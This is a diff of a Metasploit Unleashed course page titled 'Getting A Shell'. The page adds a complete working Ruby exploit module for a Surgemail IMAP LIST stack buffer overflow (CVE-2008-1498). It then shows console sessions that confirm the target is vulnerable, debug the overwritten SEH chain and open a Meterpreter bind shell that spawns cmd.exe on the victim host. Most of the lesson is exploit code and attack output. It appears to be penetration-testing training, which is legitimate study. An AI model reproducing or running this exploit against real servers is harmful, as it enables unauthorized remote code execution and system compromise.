@@ -2,7 +2,7 @@
 		<!DOCTYPE html>
 		<html xmlns="" xml:lang="en" lang="en" dir="ltr">
 		<head>
-			<title>Metasploit Unleashed</title>
+			<title>Getting A Shell - Metasploit Unleashed</title>
 			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/reset.css" />
 			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/style.css" />
 			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/main.css" />
@@ -25,10 +25,10 @@
 						
 						<div id="controls">
 									<ul>
-			<li id="ca-nstab-main" class="selected"><a href="Port_Scanners" title="View the content page [c]" accesskey="c">Page</a></li>
-			<li id="ca-talk" class="new"><a href="http://www.offensive-security.com/w/index.php?title=Talk:Main_Page&amp;action=edit&amp;redlink=1" title="Discussion about the content page [t]" accesskey="t">Discussion</a></li>
-			<li id="ca-viewsource"><a href="http://www.offensive-security.com/w/index.php?title=Main_Page&amp;action=edit" title="This page is protected.&#10;You can view its source [e]" accesskey="e">View source</a></li>
-			<li id="ca-history"><a href="http://www.offensive-security.com/w/index.php?title=Main_Page&amp;action=history" title="Past revisions of this page [h]" accesskey="h">History</a></li>
+			<li id="ca-nstab-main" class="selected"><a href="Getting_A_Shell" title="View the content page [c]" accesskey="c">Page</a></li>
+			<li id="ca-talk" class="new"><a href="http://www.offensive-security.com/w/index.php?title=Talk:Getting_A_Shell&amp;action=edit&amp;redlink=1" title="Discussion about the content page [t]" accesskey="t">Discussion</a></li>
+			<li id="ca-viewsource"><a href="http://www.offensive-security.com/w/index.php?title=Getting_A_Shell&amp;action=edit" title="This page is protected.&#10;You can view its source [e]" accesskey="e">View source</a></li>
+			<li id="ca-history"><a href="http://www.offensive-security.com/w/index.php?title=Getting_A_Shell&amp;action=history" title="Past revisions of this page [h]" accesskey="h">History</a></li>
 		</ul>
 							
 							<div class="portlet" id="p-personal">
@@ -57,36 +57,367 @@
 						<a id="top"></a>
 						
 						<div id="content">
-							<h1>Metasploit Unleashed</h1>
+							<h1>Getting A Shell</h1>
 						
 							<div id="siteSub">From Metasploit Unleashed</div>
 							<div id="contentSub"></div>
-																													<div id="jump-to-nav">Jump to: <a href="Port_Scanners#column-one">navigation</a>, <a href="Port_Scanners#searchInput">search</a></div>
+																													<div id="jump-to-nav">Jump to: <a href="Getting_A_Shell#column-one">navigation</a>, <a href="Getting_A_Shell#searchInput">search</a></div>
 														<!-- start content -->
-							<div id="mw-content-text" lang="en" dir="ltr" class="mw-content-ltr"><p>This free information security training is brought to you in a community effort to promote awareness and raise funds for underprivileged children in East Africa. Through a heart-warming effort by several security professionals, we are proud to present the most complete and in-depth open course about the Metasploit Framework.
+							<div id="mw-content-text" lang="en" dir="ltr" class="mw-content-ltr"><p>With what we have learned, we write the exploit and save it to windows/imap/surgemail_list.rb.
+<br />
+<br />
+<pre>##
+# This file is part of the Metasploit Framework and may be subject to
+# redistribution and commercial restrictions. Please see the Metasploit
+# Framework web site for more information on licensing and terms of use.
+# http://metasploit.com/projects/Framework/
+##
+
+
+require 'msf/core'
+
+
+class Metasploit3 < Msf::Exploit::Remote
+
+    include Msf::Exploit::Remote::Imap
+
+    def initialize(info = {})
+        super(update_info(info,   
+            'Name'           => 'Surgemail 3.8k4-4 IMAPD LIST Buffer Overflow',
+            'Description'    => %q{
+                This module exploits a stack overflow in the Surgemail IMAP Server
+                version 3.8k4-4 by sending an overly long LIST command. Valid IMAP
+                account credentials are required.
+            },
+            'Author'         => [ 'ryujin' ],
+            'License'        => MSF_LICENSE,
+            'Version'        => '$Revision: 1 $',
+            'References'     =>
+                [
+                    [ 'BID', '28260' ],
+                    [ 'CVE', '2008-1498' ],
+                    [ 'URL', 'http://www.milw0rm.com/exploits/5259' ],
+                ],
+            'Privileged'     => false,
+            'DefaultOptions' =>
+                {
+                    'EXITFUNC' => 'thread',
+                },
+            'Payload'        =>
+                {
+                    'Space'       => 10351,
+                    'EncoderType' => Msf::Encoder::Type::AlphanumMixed,
+                    'DisableNops' => true,
+                    'BadChars'    => "\x00"
+                },
+            'Platform'       => 'win',
+            'Targets'        =>
+                [
+                    [ 'Windows Universal', { 'Ret' => "\x7e\x51\x78" } ], # p/p/r 0x0078517e
+                ],
+            'DisclosureDate' => 'March 13 2008',
+            'DefaultTarget' => 0))
+    end
+
+    def check
+        connect
+        disconnect
+        if (banner and banner =~ /(Version 3.8k4-4)/)
+            return Exploit::CheckCode::Vulnerable
+        end
+        return Exploit::CheckCode::Safe
+    end
+
+    def exploit
+        connected = connect_login
+        nopes = "\x90"*(payload_space-payload.encoded.length) # to be fixed with make_nops()
+        sjump = "\xEB\xF9\x90\x90"     # Jmp Back
+        njump = "\xE9\xDD\xD7\xFF\xFF" # And Back Again Baby  ;)         
+        evil = nopes + payload.encoded + njump + sjump + [target.ret].pack("A3")
+        print_status("Sending payload")
+        sploit = '0002 LIST () "/' + evil + '" "PWNED"' + "\r\n"
+        sock.put(sploit)
+        handler
+        disconnect
+    end
+
+end</pre>
+<br />
+The most important things to notice in the previous code are the following:
+</p>
+<dl><dd><ul><li>We defined the maximum space for the shellcode (Space =&gt; 10351) and set the DisableNops feature to disable the automatic shellcode padding, we'll pad the payload on our own.
+</li><li>We set the default encoder to the AlphanumMixed because of the nature of the IMAP protocol.
+</li><li>We defined our 3 bytes POP POP RET return address that will be then referenced through the target.ret variable.
+</li><li>We defined a check function which can check the IMAP server banner in order to identify a vulnerable server and an exploit function that obviously is the one that does most of the work.
+</li></ul>
+</dd></dl>
+<p>Let's see if it works:
+<br />
+<br />
+<pre> msf > <span style='color:#13C16A;'>search surgemail</span>
+ <span style='color:#0000FF;'>[*]</span> Searching loaded modules for pattern 'surgemail'...
+ 
+ Exploits
+ ========
+ 
+ Name                         Description                                  
+ ----                         -----------                                  
+ windows/imap/surgemail_list  Surgemail 3.8k4-4 IMAPD LIST Buffer Overflow 
+ 
+ 
+ msf > <span style='color:#13C16A;'>use windows/imap/surgemail_list</span>
+ msf exploit(<span style='color:#ff0000;'>surgemail_list</span>) > <span style='color:#13C16A;'>show options</span>
+ 
+ Module options:
+ 
+ Name      Current Setting  Required  Description                             
+ ----      ---------------  --------  -----------                             
+ IMAPPASS  test             no        The password for the specified username 
+ IMAPUSER  test             no        The username to authenticate as         
+ RHOST     172.16.30.7      yes       The target address                      
+ RPORT     143              yes       The target port                         
+ 
+ Payload options (windows/shell/bind_tcp):
+ 
+ Name      Current Setting  Required  Description                          
+ ----      ---------------  --------  -----------                          
+ EXITFUNC  thread           yes       Exit technique: seh, thread, process 
+ LPORT     4444             yes       The local port                       
+ RHOST     172.16.30.7      no        The target address                   
+ 
+ Exploit target:
+ 
+ Id  Name               
+ --  ----               
+ 0   Windows Universal</pre>  
+<br />
+<br />
+Some of the options are already configured from our previous session (see IMAPPASS, IMAPUSER and RHOST for example). Now we check for the server version:
+<br />
+<br />
+<pre>msf exploit(<span style='color:#ff0000;'>surgemail_list</span>) > <span style='color:#13C16A;'>check</span>
+
+<span style='color:#0000FF;'>[*]</span> Connecting to IMAP server 172.16.30.7:143...
+<span style='color:#0000FF;'>[*]</span> Connected to target IMAP server.
+<span style='color:#00ff00;'>[+]</span> The target is vulnerable.</pre>
+<br />
+Yes! Now let's run the exploit attaching the debugger to the surgemail.exe process to see if the offset to overwrite SEH is correct:
+<br />
+<br />
+<pre><span style='color:#ff0000;'>root@kali</span>:~# <span style='color:#13C16A;'>msfcli exploit/windows/imap/surgemail_list PAYLOAD=windows/shell/bind_tcp RHOST=172.16.30.7 IMAPPWD=test IMAPUSER=test E</span>
+<span style='color:#0000FF;'>[*]</span> Started bind handler
+<span style='color:#0000FF;'>[*]</span> Connecting to IMAP server 172.16.30.7:143...
+<span style='color:#0000FF;'>[*]</span> Connected to target IMAP server.
+<span style='color:#0000FF;'>[*]</span> Authenticating as test with password test...
+<span style='color:#0000FF;'>[*]</span> Sending payload</pre>
 <br />
 <br />
 </p>
-<div class="center"><div class="floatnone"><a href="File:Msfu_logo_3.png" class="image"><img alt="Msfu logo 3.png" src="http://www.offensive-security.com/w/images/f/f6/Msfu_logo_3.png" width="632" height="319" /></a></div></div>
+<div class="center"><div class="floatnone"><a href="File:EXPLOIT04B.png" class="image"><img alt="EXPLOIT04B.png" src="http://www.offensive-security.com/w/images/8/8c/EXPLOIT04B.png" width="688" height="523" /></a></div></div>
 <p><br />
 <br />
-This is a free online course and if you enjoy it and find it useful, we ask that you make a donation to the HFC (Hackers For Charity), $9.00 will feed a child for a month, so any contribution is welcome. We hope you enjoy this course as much as we enjoyed making it.
+The offset is correct, we can now set a breakpoint at our return address:
 <br />
+<br />
+</p>
+<div class="center"><div class="floatnone"><a href="File:EXPLOIT04A.png" class="image"><img alt="EXPLOIT04A.png" src="http://www.offensive-security.com/w/images/3/39/EXPLOIT04A.png" width="666" height="500" /></a></div></div>
+<p><br />
+<br />
+Now we can redirect the execution flow into our buffer executing the POP POP RET instructions:
+<br />
+<br />
+</p>
+<div class="center"><div class="floatnone"><a href="File:EXPLOIT06.png" class="image"><img alt="EXPLOIT06.png" src="http://www.offensive-security.com/w/images/3/3c/EXPLOIT06.png" width="688" height="522" /></a></div></div>
+<p><br />
+<br />
+and finally execute the two jumps on the stack which will land us inside our NOP sled:
+<br />
+<br />
+</p>
+<div class="center"><div class="floatnone"><a href="File:EXPLOIT07.png" class="image"><img alt="EXPLOIT07.png" src="http://www.offensive-security.com/w/images/8/88/EXPLOIT07.png" width="688" height="522" /></a></div></div>
+<p><br />
+<br />
+So far so good, time to get our Meterpreter shell, let's rerun the exploit without the debugger:
+<br />
+<br />
+<pre>msf exploit(<span style='color:#ff0000;'>surgemail_list</span>) > <span style='color:#13C16A;'>set PAYLOAD windows/meterpreter/bind_tcp</span>
+PAYLOAD => windows/meterpreter/bind_tcp
+msf exploit(<span style='color:#ff0000;'>surgemail_list</span>) > <span style='color:#13C16A;'>exploit</span>
+
+<span style='color:#0000FF;'>[*]</span> Connecting to IMAP server 172.16.30.7:143...
+<span style='color:#0000FF;'>[*]</span> Started bind handler
+<span style='color:#0000FF;'>[*]</span> Connected to target IMAP server.
+<span style='color:#0000FF;'>[*]</span> Authenticating as test with password test...
+<span style='color:#0000FF;'>[*]</span> Sending payload
+<span style='color:#0000FF;'>[*]</span> Transmitting intermediate stager for over-sized stage...(191 bytes)
+<span style='color:#0000FF;'>[*]</span> Sending stage (2650 bytes)
+<span style='color:#0000FF;'>[*]</span> Sleeping before handling stage...
+<span style='color:#0000FF;'>[*]</span> Uploading DLL (75787 bytes)...
+<span style='color:#0000FF;'>[*]</span> Upload completed.
+<span style='color:#0000FF;'>[*]</span> Meterpreter session 1 opened (172.16.30.34:63937 -> 172.16.30.7:4444)
+
+<u>meterpreter</u> > <span style='color:#13C16A;'>execute -f cmd.exe -c -i</span>
+Process 672 created.
+Channel 1 created.
+Microsoft Windows XP [Version 5.1.2600]
+(C) Copyright 1985-2001 Microsoft Corp.
+
+c:\surgemail></pre>
+<br />
+Success! We have fuzzed a vulnerable server and built a custom exploit using the amazing features offered by Metasploit.
+<br />
+<br />
+</p>
+<hr />
+<p><br />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</p>
+<div class="Total1"><a href="Exploit_Development" title="Exploit Development">Exploit Development</a> &gt; <a href="Writing_An_Exploit" title="Writing An Exploit">Writing An Exploit</a> &gt; Getting A Shell</div>
+<p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</p>
+<div class="Total2"><strong class="selflink">Getting A Shell</strong></div>
+<p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 </p>
 <!-- 
 NewPP limit report
-Preprocessor visited node count: 6/1000000
-Preprocessor generated node count: 20/1000000
-Post‐expand include size: 0/2097152 bytes
+Preprocessor visited node count: 533/1000000
+Preprocessor generated node count: 2731/1000000
+Post‐expand include size: 3546/2097152 bytes
 Template argument size: 0/2097152 bytes
-Highest expansion depth: 2/40
+Highest expansion depth: 3/40
 Expensive parser function count: 0/100
 -->
 
-<!-- Saved in parser cache with key MSFU_Mediawiki-msfum_:pcache:idhash:285-0!*!*!*!*!2!* and timestamp 20131123153816 -->
+<!-- Saved in parser cache with key MSFU_Mediawiki-msfum_:pcache:idhash:104-0!*!0!*!*!2!* and timestamp 20131123152516 -->
 </div><div class="printfooter">
-Retrieved from "<a href="http://www.offensive-security.com/w/index.php?title=Main_Page&amp;oldid=1597">http://www.offensive-security.com/w/index.php?title=Main_Page&amp;oldid=1597</a>"</div>
-							<div id='catlinks' class='catlinks catlinks-allhidden'></div>							<!-- end content -->
+Retrieved from "<a href="http://www.offensive-security.com/w/index.php?title=Getting_A_Shell&amp;oldid=1542">http://www.offensive-security.com/w/index.php?title=Getting_A_Shell&amp;oldid=1542</a>"</div>
+							<div id='catlinks' class='catlinks'><div id="mw-normal-catlinks" class="mw-normal-catlinks"><a href="Special:Categories" title="Special:Categories">Category</a>: <ul><li><a href="http://www.offensive-security.com/w/index.php?title=Category:Writing_An_Exploit&amp;action=edit&amp;redlink=1" class="new" title="Category:Writing An Exploit (page does not exist)">Writing An Exploit</a></li></ul></div></div>							<!-- end content -->
 													</div>
 						
 					</div>
@@ -521,4 +852,4 @@ document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.
 <script type="text/javascript">
 var pageTracker = _gat._getTracker("UA-1981501-1");
 pageTracker._trackPageview();
-</script><!-- Served in 0.151 secs. --></body></html>
+</script><!-- Served in 0.138 secs. --></body></html>
